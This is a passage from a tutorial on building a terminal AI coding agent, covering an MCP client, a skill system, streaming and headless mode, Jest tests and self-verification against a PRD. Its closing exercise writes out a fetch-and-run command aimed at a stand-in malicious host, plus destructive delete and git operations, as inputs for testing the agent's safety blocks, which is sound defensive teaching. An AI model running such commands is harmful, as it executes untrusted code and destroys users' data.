   c. `connectAll()`:
      - Connect to all configured servers
      - Log which servers connected and what tools are available
      - Handle connection failures gracefully (log warning, continue)

   d. `getTools()`:
      - Return all MCP tools formatted as ToolDef[] (the provider converts to API format)
      - Prefix tool names with server name to avoid collisions (e.g., "weather__get_weather")

   e. `callTool(name: string, args: object)`:
      - Route the call to the correct server
      - Execute the tool and return the result

3. Update src/agent.ts:
   - Initialize MCPManager
   - Merge MCP tools with built-in tools in the agentic loop
   - When a tool call comes in, check if it's an MCP tool or built-in tool
   - Route accordingly

4. Update src/index.ts:
   - Show "Connecting to MCP servers..." on startup
   - Show which servers connected successfully
   - Show available MCP tools count

===
Create an MCPManager class using @modelcontextprotocol/sdk that reads .mcp.json config, spawns stdio-based MCP servers, connects and discovers their tools, prefixes tool names with server name to avoid collisions, and routes tool calls to the correct server. Merge MCP tools with built-in tools in the agentic loop. Show connected servers and tool count at startup.
:::

**Test with your Module A servers:**

If you have the weather-server from Module A:

```bash
npm start
```

```
> What's the weather in Seattle?
```

The agent should call your weather MCP server and return real data.

### ✅ Checkpoint
- [ ] MCP config file is read on startup
- [ ] Agent connects to configured servers
- [ ] MCP tools appear alongside built-in tools
- [ ] Agent can call external MCP tools

**Tasks completed:** Tasks 14-15  
**Requirements satisfied:** R17, R18, R19

**Mind-blow moment:** You built an MCP server in Module A. Now you built the client. You understand the entire protocol end-to-end — how tools are discovered, how calls are routed, how results flow back.

### 🎯 Try It Yourself

Connect your Module A servers:

1. If you built the weather server in Module A, add it to your `.mcp.json` config
2. Start your agent and ask: "What's the weather in Seattle?"
3. Trace the full request flow: your agent → MCP client → your MCP server → external API → response
4. You built every piece of this chain across the tutorial

This is the moment where the Foundation Track, Advanced Track, and Terminal Track all connect.

---

## step: skill-system
### title: Step G8: The Skill System — R20, R21, R22

> **Satisfies:** R20 (Skill discovery), R21 (Pattern matching), R22 (Lazy loading)

Remember the overview table at the start of this module?

> | "Skills load on demand" | "Pattern-match the query, lazy-load the file" |

Now you'll build exactly that mechanism. This is the same pattern used by GitHub Copilot's skill system (Part 6) and Claude Code's custom commands.

:::diagram skill-system-flow
:::

**The skill loading pattern:**

```typescript
// At startup: Index skills (read name + description only)
const skillIndex = scanSkillsDirectory('skills/')
// → [{ name: 'refactor', description: 'Refactor code for clarity...' }, ...]

// At query time: Check if any skill matches
const matchedSkill = skillIndex.find(s => 
  userQuery.toLowerCase().includes(s.name) || 
  matchesDescription(userQuery, s.description)
)

// If matched: Lazy-load the full SKILL.md content
if (matchedSkill) {
  const fullContent = await loadSkillFile(matchedSkill.path)
  // Inject into system prompt for this request
}
```

> **🔗 Foundation Connection:** In Part 6, you created skills in `.github/skills/*/SKILL.md` and they "just activated" when you mentioned certain topics. Step G8 is where you build the code that makes that happen.

:::prompt
number: G8
title: Build the skill system
---
Create a complete skill system for my-coding-agent:

1. Create src/skills/loader.ts:
   - SkillIndex type: { name: string; description: string; path: string }
   - scanSkillsDirectory(dir: string): SkillIndex[]
     * Read all subdirectories of the skills/ folder
     * For each, look for SKILL.md
     * Extract the first line as name, first paragraph as description
     * Return array of { name, description, path }
   - loadSkillContent(path: string): Promise<string>
     * Read the full SKILL.md file
     * Return its content for injection into system prompt

2. Create src/skills/matcher.ts:
   - matchSkillToQuery(query: string, index: SkillIndex[]): SkillIndex | null
     * Check if query contains skill name (case-insensitive)
     * Check if query keywords overlap with description keywords
     * Return best matching skill, or null if no match
   - Simple keyword matching is fine — no need for embeddings

3. Create two sample skills in skills/ directory:

   skills/refactor/SKILL.md:
   ```markdown
   # refactor
   
   Refactor code for improved clarity, performance, or maintainability.
   
   ## When to Use
   When the user asks to "refactor", "clean up", "improve", or "restructure" code.
   
   ## Process
   1. Read the target file(s)
   2. Identify code smells: long functions, duplicate code, unclear names
   3. Propose specific changes with rationale
   4. Apply changes incrementally (one refactor at a time)
   5. Verify the code still works after each change
   
   ## Principles
   - Preserve behavior — refactoring should not change what code does
   - Small steps — one change at a time for easy review
   - Clear names — variables and functions should reveal intent
   - DRY — Don't Repeat Yourself, extract common patterns
   - Single responsibility — each function does one thing
   
   ## Examples
   - Extract a helper function from duplicated code
   - Rename variables to be more descriptive
   - Break a 100-line function into smaller pieces
   - Replace nested conditionals with early returns
   ```

   skills/explain/SKILL.md:
   ```markdown
   # explain
   
   Explain code, concepts, or errors in clear, beginner-friendly language.
   
   ## When to Use
   When the user asks to "explain", "what does this do", "how does this work", or "help me understand".
   
   ## Process
   1. Read the target code or error message
   2. Identify the core concept or issue
   3. Explain in plain language, avoiding jargon
   4. Use analogies if helpful
   5. Provide examples to illustrate
   
   ## Style
   - Start with a one-sentence summary
   - Break complex topics into steps
   - Define technical terms on first use
   - Use "you" to address the reader directly
   
   ## Examples
   - "This function takes a list of users and filters out anyone who hasn't logged in for 30 days"
   - "The error means the file doesn't exist at that path — check if the filename is spelled correctly"
   ```

4. Update src/agent.ts:
   - Initialize SkillLoader on startup
   - Scan skills/ directory and log discovered skills count
   - Before each chat() call, check if query matches a skill
   - If matched, append skill content to the system prompt for that request
   - Log when a skill is activated: "[Skill: refactor activated]"

5. Update startup banner to show skills count:
   - "🤖 my-agent v1.0 | Provider: anthropic | 3 skills | 8 tools"

===
Build a skill system: a loader that scans skills/ for SKILL.md files and indexes their names/descriptions, a matcher that checks user queries against skill names and description keywords, and two sample skills (skills/refactor/SKILL.md with refactoring principles, skills/explain/SKILL.md with beginner-friendly explanation guidelines). Update the agent to check for matching skills before each chat, inject matched skill content into the system prompt, and show activations. Show skill count in startup banner.
:::

**Test the skill system:**

```bash
npm start
```

```
> Refactor the error handling in src/tools/read-file.ts
```

You should see `[Skill: refactor activated]` and the agent should follow the refactoring principles from the skill.

```
> Explain how the agentic loop works
```

You should see `[Skill: explain activated]` and get a beginner-friendly explanation.

### Custom Commands (Bonus)

Skills are passive — they activate when queries match. **Custom commands** are active — the user explicitly invokes them.

Claude Code uses `.claude/commands/*.md` for this. You can add the same pattern:

```
/review    → Load skills/commands/review.md and run it
/test      → Load skills/commands/test.md and run it
/ship      → Load skills/commands/ship.md and run it
```

This is how professionals build complex multi-step workflows into reusable commands.

### ✅ Checkpoint
- [ ] skills/ directory is scanned at startup
- [ ] Sample skills (refactor, explain) exist
- [ ] "Refactor this code" activates the refactor skill
- [ ] Skill content appears in system prompt when activated
- [ ] Startup banner shows skill count

**Tasks completed:** Tasks 16-17  
**Requirements satisfied:** R20, R21, R22

**Mind-blow moment:** You just built the skill system that powers GitHub Copilot's `.github/skills/*/SKILL.md`. When you said "write tests" in Part 6 and the test skill activated — this is the code that made it happen.

---

## step: polish-and-ship
### title: Step G9: Polish & Ship — R23, R24, R25, R26, R27

> **Satisfies:** R23 (/compact), R24 (/cost), R25 (Streaming), R26 (Headless), R27 (Startup banner)

Let's add the finishing touches that make your agent genuinely useful.

> **🔗 Foundation Connection:** Everything in this step mirrors features you've already used in Claude Code and Copilot CLI — `/compact`, `/cost`, headless mode, git integration. Now you understand the code behind each one.

:::prompt
number: G9
title: Add finishing features
---
Add these final features to my-coding-agent:

1. Conversation memory — src/context/memory.ts:
   - `/compact` command: When context gets long, summarize the conversation
     * Send a special request: "Summarize our conversation so far in 3-4 sentences"
     * Replace the full message history with the summary
     * Continue with reduced context
   - `/cost` command: Track and display token usage
     * Read token counts from the LLMResponse.usage field (your provider abstraction already returns this)
     * Estimate cost based on the active provider's pricing
     * Show: "Tokens: X input, Y output | Estimated cost: $Z.ZZ"

2. Headless mode — update src/index.ts:
   - Support: `node agent.js -p "your prompt here"`
   - When -p flag is provided:
     * Don't start REPL
     * Send the prompt directly
     * Print the response to stdout
     * Exit with code 0 (success) or 1 (error)
   - This enables scripting: `echo "fix the bug" | node agent.js -p -`

3. Streaming responses — update src/providers/types.ts and both providers:
   - Add a `chatStream` method to the LLMProvider interface
   - Tokens appear in real-time instead of waiting for the full response
   - The UX jump from "wait 10 seconds" to "see tokens appear live" is huge

:::tabs
tab: Anthropic
---
Use `client.messages.stream()` which returns an async iterable. Listen for `content_block_delta` events with `type: 'text_delta'` and write each `delta.text` to `process.stdout`.

tab: OpenAI
---
Pass `stream: true` to `client.chat.completions.create()`. Iterate the async stream and write each `chunk.choices[0]?.delta?.content` to `process.stdout`.
:::

4. Git tool — src/tools/git.ts:
   - Tool name: "git"
   - Description: "Run git commands"
   - Input: { subcommand: string } (e.g., "status", "diff", "log --oneline -10")
   - Permission: 'confirm' for push/commit, 'auto' for status/diff/log
   - Block: force push, reset --hard

5. Add a startup summary showing:
   - Agent name and version
   - Project name (from package.json or AGENT.md)
   - Instruction files loaded
   - MCP servers connected
   - Available tools count
   - Example: "🤖 my-agent v1.0 | Provider: anthropic | Project: devdash | 3 instruction files | 2 MCP servers | 8 tools"

===
Add polish features: /compact to summarize and reduce conversation context, /cost to show token usage and estimated cost, streaming responses using the provider SDK's streaming API, headless mode with -p flag for scripting, a git tool with auto-approve for safe commands (status/diff/log) and confirm for push/commit, and a startup banner showing provider, project, instruction files, MCP servers, and tool count.
:::

**The final test — point your agent at an unfamiliar project:**

```bash
cd /path/to/some-other-project
node /path/to/my-coding-agent/src/index.ts
```

```
> What does this project do?
> Find any bugs or issues in the main source file
> Add input validation to the API endpoint in server.ts
```

Watch your agent:
1. Read files to understand the project
2. Search for relevant code
3. Write the fix
4. Ask for your permission
5. Optionally run tests to verify

**You built this.** Every step. Every tool. Every permission check. You understand exactly how AI coding agents work because you built one from scratch.

### ✅ Checkpoint
- [ ] `/compact` summarizes and reduces context
- [ ] `/cost` shows token usage for your active provider
- [ ] Streaming mode shows tokens in real-time
- [ ] Headless mode works with `-p` flag
- [ ] Git operations work with appropriate permissions
- [ ] Startup shows project summary with provider name

**Tasks completed:** Tasks 18-21  
**Requirements satisfied:** R23, R24, R25, R26, R27

---

## step: test-the-agent
### title: Step G10: Test the Agent

You wouldn't ship production code without tests. Your agent shouldn't be different.

> **🔗 Foundation Connection:** In Module D (AI-Powered Testing), you learned to use AI to generate comprehensive test suites. Now you'll apply that same methodology to test the agent you built.

**But first — why testing agents is different from testing regular code.**

Normal tests assert exact outputs: `add(2, 3)` always returns `5`. Agent tests can't do that. The LLM might phrase things differently each time, choose a different tool order, or take more iterations to reach the same outcome.

**The three testing strategies for agent code:**

| Strategy | What It Tests | How |
|----------|---------------|-----|
| **Deterministic unit tests** | Tools, permissions, registry, loaders | Mock the LLM entirely. Test the code *around* the AI. |
| **Mock provider tests** | Agentic loop, error recovery, stop conditions | Create a fake `LLMProvider` that returns scripted responses. Verify the loop handles them correctly. |
| **Integration smoke tests** | End-to-end with real LLM | Run with a real API key, assert on *structure* not exact text ("response contains a file path", not "response equals X"). |

**The key insight: mock the brain, test the body.** Your provider abstraction (G2) makes this possible — you can swap in a mock provider that returns predetermined tool calls and responses. The agentic loop doesn't know the difference.

```typescript
// Example: A mock provider for testing
const mockProvider: LLMProvider = {
  name: 'mock',
  async chat(systemPrompt, messages, tools) {
    // First call: return a tool call
    if (messages.length === 1) {
      return {
        toolCalls: [{ id: '1', name: 'read_file', input: { path: 'package.json' } }],
        done: false
      }
    }
    // Second call: return final response
    return { text: 'This is a Node.js project.', done: true }
  }
}
```

With this mock, you can test that the agentic loop:
- Calls the tool when the provider requests it
- Feeds the tool result back as a message
- Stops when `done: true`
- Never calls the real API

**What to test:**

| Component | Test Coverage |
|-----------|---------------|
| Tool Registry | Tool registration, execution, permission checks |
| Permission Gates | Auto/confirm/block behavior, blocked patterns |
| Agentic Loop | Stop conditions, max iterations, error recovery |
| Context Loader | File discovery, content loading, prompt building |
| Skill Matcher | Name matching, description matching, no-match case |
| Provider Abstraction | Response parsing, tool call extraction |

:::prompt
number: G10
title: Generate tests for the agent
---
Create a comprehensive test suite for my-coding-agent using Jest:

1. Set up Jest:
   - Add dependencies: jest, @types/jest, ts-jest
   - Create jest.config.js with TypeScript support
   - Add test script: "test": "jest"

2. Create tests/tools.test.ts:
   ```typescript
   describe('ToolRegistry', () => {
     test('registers tools and retrieves by name', ...)
     test('returns tool definitions as array', ...)
     test('executes registered tool with input', ...)
     test('returns error string for unknown tool', ...)
   })
   
   describe('read_file tool', () => {
     test('reads existing file and returns content', ...)
     test('returns error message for non-existent file', ...)
   })
   
   describe('list_directory tool', () => {
     test('lists files in directory', ...)
     test('marks directories with trailing slash', ...)
   })
   ```

3. Create tests/permissions.test.ts:
   ```typescript
   describe('Permission System', () => {
     test('auto permission executes immediately', ...)
     test('block permission refuses and returns message', ...)
     test('blocked patterns trigger block in run_command', ...)
     // Note: 'confirm' is hard to test without mocking readline
   })
   ```

4. Create tests/agentic-loop.test.ts:
   ```typescript
   describe('Agentic Loop', () => {
     // Mock the provider for these tests
     test('stops when response.done is true', ...)
     test('continues when response has tool calls', ...)
     test('stops at max iteration limit', ...)
     test('catches tool execution errors and continues', ...)
   })
   ```

5. Create tests/skills.test.ts:
   ```typescript
   describe('Skill System', () => {
     test('discovers skills in skills/ directory', ...)
     test('matches query containing skill name', ...)
     test('matches query with description keywords', ...)
     test('returns null for non-matching query', ...)
     test('loads full skill content when matched', ...)
   })
   ```

6. Create tests/context-loader.test.ts:
   ```typescript
   describe('Context Loader', () => {
     test('finds AGENT.md in project root', ...)
     test('combines multiple instruction files', ...)
     test('scans package.json for project info', ...)
   })
   ```

Use mocks for:
- File system operations (use a temp directory or mock fs)
- LLM API calls (mock the provider)
- User input (mock readline)

===
Create a Jest test suite with ts-jest for my coding agent. Write tests for: ToolRegistry (register/retrieve/execute/unknown tool handling), read_file and list_directory tools, permission system (auto executes, block refuses, dangerous patterns), agentic loop (stops when done, continues on tool calls, max iterations, error recovery), skill system (discovery, matching by name and description, no-match, content loading), and context loader (finds instruction files, combines them, scans package.json). Use mocks for filesystem, LLM API, and readline. Target 80%+ coverage.
:::

**Run the tests:**

```bash
npm test
```

Your target: **80%+ code coverage** on core modules (tools/, context/, skills/).

```bash
npm test -- --coverage
```

### ✅ Checkpoint
- [ ] Jest is configured with TypeScript support
- [ ] Tool tests pass (registry, read_file, list_directory)
- [ ] Permission tests pass (auto, block)
- [ ] Agentic loop tests pass (stop conditions, error handling)
- [ ] Skill tests pass (discovery, matching, loading)
- [ ] 80%+ code coverage on core modules

---

## step: verify-requirements
### title: Step G11: Verify Against Requirements

The final step brings everything full circle. Back in G0, you wrote 27 requirements in `specs/PRD.md`. Now you'll verify that every requirement is satisfied.

> **🔗 Foundation Connection:** In Part 6, you created a `verify-requirements` skill that generated a PASS/FAIL table. Now you'll do the same verification — for a tool that will help others do this same verification.

**The verification process:**

:::prompt
number: G11
title: Verify against PRD requirements
---
Using my-coding-agent (the tool you just built!), verify it against its own PRD:

1. Start the agent:
   ```bash
   npm start
   ```

2. Run this verification prompt:
   ```
   Read specs/PRD.md and compare each requirement (R1-R27) against the 
   actual implementation. For each requirement, check if it's implemented
   and working.
   
   Generate a verification report table with columns:
   - Requirement ID
   - Description (brief)
   - Status: PASS / FAIL / PARTIAL
   - Evidence (file or test that proves it)
   
   Be thorough — actually read the source files to verify.
   ```

3. Review the output. It should look like:

   | Req | Description | Status | Evidence |
   |-----|-------------|--------|----------|
   | R1 | Interactive REPL | PASS | src/index.ts:23 - REPL loop |
   | R2 | Graceful Ctrl+C | PASS | src/index.ts:45 - SIGINT handler |
   | R3 | Provider interface | PASS | src/providers/types.ts - LLMProvider |
   | ... | ... | ... | ... |
   | R20 | Skill discovery | PASS | src/skills/loader.ts - scanSkillsDirectory |
   | R21 | Pattern matching | PASS | src/skills/matcher.ts - matchSkillToQuery |
   | R22 | Lazy loading | PASS | src/skills/loader.ts - loadSkillContent |
   | ... | ... | ... | ... |

4. For any FAIL or PARTIAL status, fix the implementation and re-verify.

5. Update specs/Tasks.md — mark all completed tasks as [x]

6. Create a final verification summary in docs/VERIFICATION.md:
   ```markdown
   # my-coding-agent Verification Report

   **Date:** [today]
   **PRD:** specs/PRD.md
   **Total Requirements:** 27
   **Passed:** 27 (100%)
   **Failed:** 0
   
   ## Summary
   All requirements verified against implementation.
   
   [Full verification table...]
   ```

===
Use my-coding-agent to verify itself against specs/PRD.md. Have it read each requirement R1-R27, check the actual source files for evidence, and generate a verification table with Requirement ID, Description, Status (PASS/FAIL/PARTIAL), and Evidence (file + line). Fix any failures, then save the report as docs/VERIFICATION.md and mark all tasks complete in Tasks.md.
:::

**The meta moment:**

You just used the agent you built to verify that the agent you built meets its own requirements. This is the spec-driven development loop at its finest:

```
Spec it (PRD.md)  →  Build it (G1-G9)  →  Test it (G10)  →  Verify it (G11)  →  Use it (G12)
   ↑                                                                                │
   └────────────────────── Fix any failures and re-verify ─────────────────────────┘
```

### ✅ Final Checkpoint — Module G Complete
- [ ] All 27 requirements pass verification
- [ ] All 21 tasks marked complete in Tasks.md
- [ ] Test coverage at 80%+
- [ ] Verification report saved in docs/VERIFICATION.md
- [ ] Agent can verify itself against its own spec (meta!)

### What You've Built

```
my-coding-agent/
├── specs/
│   ├── PRD.md                # 27 requirements (R1-R27)
│   └── Tasks.md              # 21 tasks mapped to requirements
├── src/
│   ├── index.ts              # CLI entry (REPL + headless mode)
│   ├── agent.ts              # Agentic loop — the core engine
│   ├── providers/
│   │   ├── types.ts          # LLMProvider interface ✅
│   │   ├── anthropic.ts      # Anthropic provider ✅
│   │   ├── openai.ts         # OpenAI provider ✅
│   │   └── index.ts          # Auto-detect factory ✅
│   ├── tools/
│   │   ├── registry.ts       # Tool registration + permission gates ✅
│   │   ├── read-file.ts      # Read file contents ✅
│   │   ├── write-file.ts     # Write files (with approval) ✅
│   │   ├── run-command.ts    # Run commands (with approval) ✅
│   │   ├── list-directory.ts # List directories ✅
│   │   ├── search-files.ts   # Search codebase ✅
│   │   └── git.ts            # Git operations ✅
│   ├── context/
│   │   ├── loader.ts         # Reads instruction files ✅
│   │   └── memory.ts         # /compact + /cost ✅
│   ├── skills/
│   │   ├── loader.ts         # Skill discovery & lazy loading ✅
│   │   └── matcher.ts        # Pattern matching ✅
│   └── mcp/
│       └── client.ts         # MCP client — connects to servers ✅
├── skills/                   # Agent's own skills 
│   ├── refactor/SKILL.md   # Code refactoring guidance
│   └── explain/SKILL.md    # Concept explanation guidance
├── tests/                    # Jest test suite
│   ├── tools.test.ts       # Tool registry tests
│   ├── permissions.test.ts # Permission system tests
│   ├── agentic-loop.test.ts # Core loop tests
│   ├── skills.test.ts      # Skill system tests
│   └── context-loader.test.ts
├── docs/
│   └── VERIFICATION.md     # Requirement verification report
├── AGENT.md                  # The agent's own instruction file
├── package.json
├── jest.config.js
└── tsconfig.json
```

**This is resume-worthy.** "I built a terminal-based AI coding agent with multi-provider support, tool use, skill system, MCP client, permission gates, comprehensive tests, and spec-driven verification" is a portfolio piece that gets attention.

**Every concept from the entire tutorial now has a mechanical explanation:**

| What you learned | Where you built it |
|-----------------|-------------------|
| Instruction files follow rules | G6: Context loader reads and injects them |
| Agent Mode loops until done | G3: The agentic while loop |
| Tools have permissions | G5: Permission gates |
| MCP servers expose tools | G7: MCP client discovers and calls them |
| Skills load on demand | G8: Pattern matching + lazy loading |
| Spec-driven development | G0, G11: PRD → Build → Verify |
| AI-generated tests | G10: Jest suite for your agent |

---

## step: use-your-own-agent
### title: Step G12: Use Your Own Agent on a Real Project

You've built it, tested it, and verified it against the spec. Now it's time to **use it.** Not as a homework exercise — as a tool.

This step closes the loop. In Module F, you learned to use Claude Code and Copilot CLI. Now you'll use the agent *you built* on a real codebase — and notice the difference between using someone else's tool and using your own.

**The exercise: Onboard to a new project with YOUR agent**

```bash
# Clone something you haven't worked with
git clone https://github.com/sindresorhus/got.git
cd got

# Launch YOUR agent, not Claude Code, not Copilot CLI
npm start
```

**Step 1: Explore**

```
> What does this project do? Give me a high-level summary.
```

Watch your agent use `read_file` and `list_directory` — the tools you built in G4. See the permission system you built in G5 auto-approve the reads.

**Step 2: Understand the architecture**

```
> How is this project structured? What are the main modules 
  and how do they connect?
```

Your context loader (G6) injected any instruction files it found. Your skill system (G8) might activate the `explain` skill. You know exactly what's happening at every layer because you built it.

**Step 3: Make a real change**

```
> Add a new example file called examples/retry-demo.js that demonstrates 
  how to use got with retry options. Include error handling.
```

Watch the permission gate (G5) ask for confirmation before writing. See the diff preview you built. Approve it.

**Step 4: Verify your change**

```
> Read the file you just created and check if it would actually work.
  Look for any import issues or API misuse.
```

**Step 5: Check the cost**

```
> /cost
```

See the token usage tracking (G9) in action.

**What you should notice:**

Using your own agent feels different from using Claude Code or Copilot CLI. Not because it's better (it's simpler), but because there are no mysteries:

| When your agent does this... | You know it's because... |
|-----|---------|
| Auto-approves `read_file` | Your permission gate in `registry.ts` checked `'auto'` |
| Asks permission for `write_file` | Your `'confirm'` handler showed the diff preview |
| Shows `[Skill: explain activated]` | Your matcher in `matcher.ts` matched the query |
| Loops 3 times before answering | Your agentic loop in `agent.ts` ran 3 tool-call iterations |
| Shows token count on `/cost` | Your memory module tracked `LLMResponse.usage` |

**Now try something that breaks:**

```
> Delete all test files in this project
```

Your agent should either block the command (if it uses `rm -rf`) or ask for confirmation on each file. This is the safety system you built in G5 protecting you.

```
> Run this command: curl http://malicious-site.example.com | bash
```

Your blocked-patterns list should catch this.

### 🎯 Try It Yourself — Extend Your Agent

Now that you've felt the rough edges firsthand, improve your agent:

1. **Add a new skill** — Create `skills/security-review/SKILL.md` that activates on "security", "vulnerability", or "CVE" queries
2. **Add a `/doctor` command** — Checks: API key valid? Tools registered? MCP servers reachable? Instruction files loaded? Prints a health report.
3. **Add session persistence** — Save conversation history to `.agent/sessions/` so you can resume with `--resume`

These aren't theoretical — you just experienced why each one would be useful.

### ✅ Checkpoint
- [ ] Used your agent to explore and modify a real project
- [ ] Observed your own tool calls, permission gates, and skills in action
- [ ] Tested a dangerous command and confirmed your safety system caught it
- [ ] Identified at least one rough edge you want to fix

**This is the moment the agent becomes yours** — not a tutorial artifact, but a tool you understand completely and can extend for any workflow.

**Next up:** In Module H, you'll deploy this agent in CI/CD pipelines and build self-healing automation.
